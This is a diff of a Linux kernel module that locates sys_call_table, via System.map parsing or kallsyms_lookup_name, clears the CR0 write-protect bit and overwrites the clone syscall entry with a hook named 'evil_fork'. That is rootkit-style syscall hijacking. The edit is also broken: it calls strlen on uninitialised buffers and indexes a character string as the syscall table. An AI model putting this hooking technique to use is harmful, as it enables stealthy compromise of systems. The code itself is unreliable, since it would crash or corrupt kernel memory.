@@ -137,14 +137,12 @@ int init_module (void) {
 	char* syscallAddress;
 	char* entry;
 
-	/*kernelVersion = kmalloc (1024, GFP_DMA | GFP_KERNEL);
+	kernelVersion = kmalloc (1024, GFP_DMA | GFP_KERNEL);
 	sysmapfile = kmalloc (1024, GFP_DMA | GFP_KERNEL);
-
 	kernelVersion[strlen(kernelVersion)] = '\0';
 	sysmapfile[strlen(sysmapfile)] = '\0';
 	
-	sysmapfile = "/boot/System.map-4.19.0-13-amd64";
-
+	/*sysmapfile = "/boot/System.map-4.19.0-13-amd64";*/
 	file = open_file_for_read("/proc/version");
 	x = read_from_file_until(file, kernelVersion, 1024, '(');
 	close_file(file);
@@ -155,59 +153,50 @@ int init_module (void) {
 	strcat (sysmapfile, kernelVersion);
 	
 	printk(KERN_INFO "System Map: %s\n", sysmapfile);
-
-
 	sysmap = open_file_for_read(sysmapfile);
-
 	syscallAddress = kmalloc (100, GFP_DMA | GFP_KERNEL);
 	syscallAddress[strlen(syscallAddress)] = '\0';
-
 	while(1) {
 		entry = kmalloc (100, GFP_DMA | GFP_KERNEL);
 		entry[strlen(entry)] = '\0';
 		y = read_from_file_until(sysmap, entry, 100, '\n');
-
 		if(strstr(entry, "sys_call_table") != NULL) {
 			
 			strncpy(syscallAddress, entry, 16);
-
 			
 			printk(KERN_INFO "sys_call address: %s\n", syscallAddress);
-
 				unsigned long kPointer;
 			
 				sscanf(syscallAddress, "%lx", &kPointer);
 				sys_call_ptr_t *sys_call_table;
 				sys_call_table = (sys_call_ptr_t *)kPointer;
 				printk(KERN_INFO "sys_fork address: %lx\n", sys_call_table[__NR_clone]);
-
 			break;
 		}
 	}
-
-	close_file(sysmap);*/
+	close_file(sysmap);
 
 	
 
 	syscall_table = (void*) kallsyms_lookup_name("sys_call_table");
 
-	if (syscall_table == NULL) {
+	/*if (syscall_table == NULL) {
 		printk (KERN_INFO "Could not find sys_call_table\n");
 	} else {
 		printk(KERN_INFO "sys_fork address: %lx\n", syscall_table[__NR_clone]);
-	}
+	}*/
 
 	/*disable_write_protection();*/
 
 	write_cr0(read_cr0() & (~0x10000));
 
-	original_sys_fork = syscall_table[__NR_clone];
+	original_sys_fork = syscallAddress[__NR_clone];
 
 	
 
 	/*set_page_rw(syscall_table);*/
 
-	syscall_table[__NR_clone] = evil_fork;
+	syscallAddress[__NR_clone] = evil_fork;
 
 	/*original_sys_fork = (void *) xchg(&syscall_table[__NR_clone],evil_fork);*/
 
